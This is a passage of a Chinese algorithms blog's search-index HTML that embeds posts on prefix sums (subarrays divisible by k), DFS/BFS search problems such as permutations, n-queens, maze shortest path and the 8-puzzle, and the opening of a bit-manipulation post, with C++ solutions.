class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathrm&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，根据 同余定理，只要 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;m&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;o&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;m&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;o&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;P[j] \bmod k == P[i-1] \bmod k&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathrm&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathrm&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，就可以保证上面的等式成立。&lt;/p&gt;
&lt;p&gt;因此我们可以考虑对数组进行遍历，在遍历同时统计答案。当我们遍历到第 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.65952em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 个元素时，我们统计以 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.65952em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 结尾的符合条件的子数组个数。我们可以维护一个以前缀和模 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;k&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 的值为键，出现次数为值的哈希表 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;record&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\textit{record}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;record&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，在遍历的同时进行更新。这样在计算以 i 结尾的符合条件的子数组个数时，根据上面的分析，答案即为 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;0..&lt;/mn&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[0..i-1]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 中前缀和模 k 也为 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;m&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;o&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;P[i] \bmod k&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathrm&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 的位置个数，即 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;record&lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;m&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;o&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\textit{record}[P[i] \bmod k]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;record&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathrm&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int subarraysDivByK(vector&amp;lt;int&amp;gt;&amp;amp; nums, int k) {
        unordered_map&amp;lt;int, int&amp;gt; record = {{0, 1}};
        int sum = 0, ans = 0;
        for (int elem: nums) {
            sum += elem;
            // 注意 C++ 取模的特殊性，当被除数为负数时取模结果为负数，需要纠正
            int modulus = (sum % k + k) % k;
            if (record.count(modulus)) {
                ans += record[modulus];
            }
            ++record[modulus];
        }
        return ans;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;a href=&#34;https://leetcode-cn.com/problems/find-the-longest-substring-containing-vowels-in-even-counts/&#34;&gt;每个元音包含偶数次的最长子字符串&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://leetcode-cn.com/problems/number-of-wonderful-substrings/&#34;&gt;最美子字符串的数目&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
">【算法】前缀和</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-sou-suo-yu-tu-lun/"" data-c="
          &lt;h1 id=&#34;搜索&#34;&gt;搜索&lt;/h1&gt;
&lt;h2 id=&#34;dfs&#34;&gt;DFS&lt;/h2&gt;
&lt;p&gt;优缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;容易爆栈，如果有1e4层就爆了。&lt;/li&gt;
&lt;li&gt;空间和深度成正比，相对较小&lt;/li&gt;
&lt;li&gt;不能搜最短、最小&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;排列数字&#34;&gt;排列数字&lt;/h3&gt;
&lt;p&gt;给定一个整数 n，将数字 1∼n 排成一排，将会有很多种排列方法。&lt;/p&gt;
&lt;p&gt;现在，请你按照字典序将所有的排列方法输出。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;vector&amp;gt;

using namespace std;

int n;
int use[10] = {0};

void dfs(vector&amp;lt;int&amp;gt; res)
{
    if(res.size()==n)
    {
        for(int i = 0; i &amp;lt; n; i ++)
            cout &amp;lt;&amp;lt; res[i] &amp;lt;&amp;lt;&amp;quot; &amp;quot;;
        cout &amp;lt;&amp;lt; endl;
        return;
    }
    for(int i = 1; i &amp;lt;= n; i ++)
        if(!use[i])
        {
            use[i] = 1;
            res.push_back(i);
            dfs(res);
            res.pop_back();
            use[i] = 0;
        }
}

int main()
{
    vector&amp;lt;int&amp;gt; res;
    cin &amp;gt;&amp;gt; n;
    dfs(res);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;n-皇后问题&#34;&gt;n-皇后问题&lt;/h3&gt;
&lt;p&gt;n−皇后问题是指将 n 个皇后放在 n×n 的国际象棋棋盘上，使得皇后不能相互攻击到，即任意两个皇后都不能处于同一行、同一列或同一斜线上。&lt;/p&gt;
&lt;p&gt;现在给定整数 n，请你输出所有的满足条件的棋子摆法。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;输入样例：
4
输出样例：
.Q..
...Q
Q...
..Q.

..Q.
Q...
...Q
.Q..
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;iostream&amp;gt;

using namespace std;

const int N = 20;
char map[N][N];
// 标记该点对应的列、斜线、反斜线是否有皇后，从左下到右上对应slash[1~15]，从左上到右下对应backslash[1~15]
bool col[N], slash[N*2], backslash[N*2]; 
int n;

void dfs(int row)
{
    if(row == n + 1)
    {
        for(int i = 1; i &amp;lt;= n; i ++)
        {
            for(int j = 1; j &amp;lt;= n; j ++)
                cout &amp;lt;&amp;lt; map[i][j];
            cout &amp;lt;&amp;lt; endl;
        }
        cout &amp;lt;&amp;lt; endl;
    }
    for(int j = 1; j &amp;lt;= n; j ++)
    {
        if(!col[j] &amp;amp;&amp;amp; !slash[j - row + n] &amp;amp;&amp;amp; !backslash[j + row -1])
        {
            map[row][j] = &#39;Q&#39;;
            col[j] = slash[j - row + n] = backslash[j + row - 1] = true;
            dfs(row + 1);
            map[row][j] = &#39;.&#39;;
            col[j] = slash[j - row + n] = backslash[j + row - 1] = false;
        }
    }
}

int main()
{
    cin &amp;gt;&amp;gt; n;
    for(int i = 1; i &amp;lt;= n; i++)
        for(int j = 1; j &amp;lt;= n; j++)
            map[i][j] = &#39;.&#39;;
    dfs(1);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;bfs&#34;&gt;BFS&lt;/h2&gt;
&lt;p&gt;优缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;空间的指数级别大&lt;/li&gt;
&lt;li&gt;不会有爆栈的风险&lt;/li&gt;
&lt;li&gt;可以搜最短、最小&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;走迷宫&#34;&gt;走迷宫&lt;/h3&gt;
&lt;p&gt;给定一个 n×m 的二维整数数组，用来表示一个迷宫，数组中只包含 0 或 1，其中 0 表示可以走的路，1 表示不可通过的墙壁。&lt;/p&gt;
&lt;p&gt;最初，有一个人位于左上角 (1,1) 处，已知该人每次可以向上、下、左、右任意一个方向移动一个位置。&lt;/p&gt;
&lt;p&gt;请问，该人从左上角移动至右下角 (n,m) 处，至少需要移动多少次。&lt;/p&gt;
&lt;p&gt;数据保证 (1,1) 处和 (n,m) 处的数字为 0，且一定至少存在一条通路。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;queue&amp;gt;

using namespace std;

int main()
{
    int n, m;
    bool map[101][101];
    int dir[4][2] = {{-1, 0}, {1, 0}, {0, 1}, {0, -1}};
    int dis[101][101];
    queue&amp;lt;pair&amp;lt;int, int&amp;gt; &amp;gt; q;
    
    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
    for(int i = 1; i &amp;lt;= n; i ++)
        for(int j = 1; j &amp;lt;= m; j++)
        {
            cin &amp;gt;&amp;gt; map[i][j];
            dis[i][j] = -1;
        }
    dis[1][1] = 0;
    q.push({1, 1});
    
    while(!q.empty())
    {
        int x = q.front().first;
        int y = q.front().second;
        q.pop();
        
        for(int i = 0; i &amp;lt; 4; i++)
        {
            int nextx = x + dir[i][0];
            int nexty = y + dir[i][1];
            if(nextx&amp;gt;=1 &amp;amp;&amp;amp; nextx&amp;lt;=n &amp;amp;&amp;amp; nexty&amp;gt;=1 &amp;amp;&amp;amp; nexty&amp;lt;=m &amp;amp;&amp;amp; map[nextx][nexty]==0 &amp;amp;&amp;amp; dis[nextx][nexty] == -1)
            {
                q.push({nextx, nexty});
                dis[nextx][nexty] = dis[x][y] + 1;
            }
        }
    }
    cout &amp;lt;&amp;lt; dis[n][m];
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;数字华容道&#34;&gt;数字华容道&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;queue&amp;gt;
#include &amp;lt;unordered_map&amp;gt;

using namespace std;

int main()
{
    string start;
    string tmp;
    queue&amp;lt;string&amp;gt; q;
    unordered_map&amp;lt;string, int&amp;gt; d;
    
    string ans = &amp;quot;12345678x&amp;quot;;
    
    int dx[] = {-1, 0, 1, 0}, dy[] = {0, -1, 0, 1};
    
    for(int i = 0; i &amp;lt; 9; i ++)
    {
        cin &amp;gt;&amp;gt; tmp;
        start += tmp;
    }
    
    // cout &amp;lt;&amp;lt; start &amp;lt;&amp;lt; endl;
    
    q.push(start);
    d[start] = 0;
    
    
    while(!q.empty())
    {
        string str = q.front();
        q.pop();
        int dis = d[str];
        
        int k = str.find(&#39;x&#39;);
        int x = k / 3, y = k % 3;
        
        for(int i = 0; i &amp;lt; 4; i ++)
        {
            int nx = x + dx[i], ny = y + dy[i];
            if(nx &amp;gt;= 0 &amp;amp;&amp;amp; nx &amp;lt; 3 &amp;amp;&amp;amp; ny &amp;gt;= 0 &amp;amp;&amp;amp; ny &amp;lt; 3)
            {
                swap(str[nx * 3 + ny], str[k]);
                if(str == ans) 
                {
                    cout &amp;lt;&amp;lt; dis + 1 &amp;lt;&amp;lt; endl;
                    return 0;
                }
                
                if(d.find(str) == d.end())
                {
                    q.push(str);
                    d[str] = dis + 1;
                }
                    
                swap(str[nx * 3 + ny], str[k]);
            }
            
        }
        
    }
    cout &amp;lt;&amp;lt; -1 &amp;lt;&amp;lt;endl;
    return 0;
    
}
&lt;/code&gt;&lt;/pre&gt;
">【算法】搜索与图论</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/wei-yun-suan/"" data-c="
          &lt;h2 id=&#34;应用&#34;&gt;应用&lt;/h2&gt;
&lt;h3 id=&#34;求一个数二进制表示中1的个数&#34;&gt;求一个数二进制表示中1的个数&lt;/h3&gt;
&lt;p&gt;利用到了一个数的原码和补码。&lt;/p&gt;
&lt;p&gt;一个数的原码和补码按位相与可以得到这个数的最低位的1所表示的数的大小，例如：&lt;/p&gt;
